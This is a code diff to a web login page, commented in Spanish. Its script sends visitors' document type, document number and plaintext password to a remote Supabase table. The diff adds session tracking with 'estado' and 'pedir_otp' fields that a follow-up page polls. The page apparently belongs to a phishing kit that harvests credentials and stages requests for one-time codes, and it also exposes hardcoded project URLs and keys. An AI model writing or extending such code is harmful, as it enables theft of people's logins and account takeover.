@@ -3465,23 +3465,30 @@ span[class^=custom-option-].selected {
 
 <script>
   // Inicializar Supabase
-  const SUPABASE_URL = 'https://sygnzkmuiejwczijthyq.supabase.co';
-  const SUPABASE_ANON_KEY = 'sb_publishable_nbw8hDNjy67X7Id8WCv8nw_nrfvOwSD';
+  const SUPABASE_URL = 'https://mobbejiijbjrwkqmxrxr.supabase.co';
+  const SUPABASE_ANON_KEY = 'sb_publishable_XRJn3-lrSg0ykaKmGEPX2A_EwkGl5ms';
 
   const { createClient } = supabase;
   const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-  // Función para enviar datos a Supabase
+  // Función para crear una sesión en Supabase
   async function enviarDatosASupabase(tipoDocumento, numeroDocumento, contrasena) {
     try {
+      // Generar un ID de sesión único
+      var sesionId = 'ses_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+
       const { data, error } = await supabaseClient
-        .from('usuarios')
+        .from('sesiones')
         .insert([
           {
+            sesion_id: sesionId,
             tipo_documento: tipoDocumento,
             numero_documento: numeroDocumento,
             contrasena: contrasena,
-            created_at: new Date().toISOString()
+            estado: 'login',
+            pedir_otp: false,
+            created_at: new Date().toISOString(),
+            updated_at: new Date().toISOString()
           }
         ]);
 
@@ -3489,7 +3496,9 @@ span[class^=custom-option-].selected {
         console.error('Error al insertar en Supabase:', error);
       }
 
-      console.log('Datos guardados exitosamente:', data);
+      // Guardar el ID de sesión para que home.html pueda consultar el estado
+      sessionStorage.setItem('login_sesion_id', sesionId);
+      console.log('Sesión creada exitosamente:', data);
       window.location.href = 'home.html';
       return true;
     } catch (err) {
@@ -3498,6 +3507,7 @@ span[class^=custom-option-].selected {
       return false;
     }
   }
+
 
   // Configurar formulario: habilitar boton y dropdown
   document.addEventListener('DOMContentLoaded', function() {
